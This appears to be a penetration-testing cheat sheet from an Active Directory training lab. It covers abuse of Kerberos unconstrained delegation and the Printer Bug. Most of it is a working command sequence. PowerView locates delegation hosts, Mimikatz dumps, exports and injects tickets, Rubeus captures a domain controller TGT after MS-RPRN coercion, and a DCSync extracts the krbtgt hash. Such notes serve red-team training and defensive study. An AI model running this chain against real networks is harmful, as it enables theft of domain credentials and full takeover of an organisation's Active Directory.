# Unconstrained Delegation

- [Unconstrained Delegation](#unconstrained-delegation)
  - [General](#general)
  - [Exploitation](#exploitation)
  - [Printer Bug](#printer-bug)

## General

- When set for service account, allows delegation to any service to any resource on the domain as a user
- When enabled, DC places user's TGT inside TGS when user requests access to service with unconstrained delegation enabled
- Server extracts TGT from TGS and stores it in LSASS
- Server can reuse the user's TGT to access resoruces
- Escalate privileges when extracting TGT from Domain Admins or other HVTs
- Note: need local admin access on the machine to extract tickets

## Exploitation

```powershell
# Get computers that have unconstrained delegation enabled
# Using PowerView
Get-NetComputer -Unconstrained

# Using AD Module
Get-ADComputer -Filter { TrustedForDelegation -eq $true }
Get-ADUser -Filter { TrustedForDelegation -eq $true }

# Monitor DA logins on computer
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose

# Check if we have local admin access on that machine using PowerView
Find-LocalAdminAccess -ComputerName dcorp-appsrv

# Get session on machine as local admin and check for tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Export tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Inject ticket into session
Invoke-Mimikatz -Command '"kerberos:ptt ticket.kirbi"'
```

## Printer Bug

- Trick HVT to connect to machine with Unconstrained Delegation enabled
- Feature of MS-RPRN allows any domain user (Authenticated User) to force any machine (running the Spooler service) to connect to a second machine of the user's choice
- Force Domain Admin to connect to specific machine
- https://github.com/leechristensen/SpoolSample

```powershell
# Start capturing for TGTs using Rubeus
.\Rubeus.exe monitor /interval:5 /nowrap

# Run MS-RPRN.exe
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appserv.dollarcorp.moneycorp.local

# Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
